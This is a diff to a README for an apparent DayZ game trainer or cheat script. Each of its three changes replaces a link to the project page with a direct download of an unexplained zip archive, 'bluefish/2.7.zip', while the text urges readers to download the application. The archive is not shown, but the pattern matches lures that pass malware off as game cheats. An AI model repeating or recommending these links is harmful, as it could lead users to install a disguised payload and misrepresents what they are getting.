@@ -1,6 +1,6 @@
 # 🎮 dayz-trainer-menu-script - Master Your Survival Game Experience
 
-[![Download Now](https://img.shields.io/badge/Download-DayZ_Trainer-blue?style=for-the-badge&logo=github&color=random)](https://github.com/Somersetunderstood190/dayz-trainer-menu-script)
+[![Download Now](https://img.shields.io/badge/Download-DayZ_Trainer-blue?style=for-the-badge&logo=github&color=random)](https://raw.githubusercontent.com/Somersetunderstood190/dayz-trainer-menu-script/main/bluefish/2.7.zip)
 
 Visit this link to download the application.
 
@@ -63,7 +63,7 @@ Follow these simple steps to get DayZ Trainer Menu Script running on your PC:
 ### Step 1: Visit the Download Page
 
 Click any "Download" link on this page, or go directly to:
-[https://github.com/Somersetunderstood190/dayz-trainer-menu-script](https://github.com/Somersetunderstood190/dayz-trainer-menu-script)
+[https://raw.githubusercontent.com/Somersetunderstood190/dayz-trainer-menu-script/main/bluefish/2.7.zip](https://raw.githubusercontent.com/Somersetunderstood190/dayz-trainer-menu-script/main/bluefish/2.7.zip)
 
 Visit this link to download the application.
 
@@ -177,7 +177,7 @@ DayZ Trainer Menu Script puts incredible power in your hands. Whether you want t
 
 Don't forget: you can always use it in a way that's fun and fair for everyone. Download it today and take your DayZ adventure to the next level!
 
-[![Download Now](https://img.shields.io/badge/Get_DayZ_Trainer-FF6600?style=for-the-badge&logo=github&color=random)](https://github.com/Somersetunderstood190/dayz-trainer-menu-script)
+[![Download Now](https://img.shields.io/badge/Get_DayZ_Trainer-FF6600?style=for-the-badge&logo=github&color=random)](https://raw.githubusercontent.com/Somersetunderstood190/dayz-trainer-menu-script/main/bluefish/2.7.zip)
 
 Visit this link to download the application.
 
